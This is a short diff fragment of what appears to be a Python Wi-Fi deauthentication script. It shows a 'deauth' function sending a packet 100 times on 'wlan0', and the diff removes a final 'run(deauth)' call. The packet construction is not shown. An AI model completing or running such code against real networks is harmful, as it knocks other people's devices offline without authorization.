@@ -23,5 +23,3 @@ def deauth(target_mac, gateway_mac):
     sendp(packet, inter=0.01,
           count=100, iface='wlan0',
           verbose=1)
-
-run(deauth)
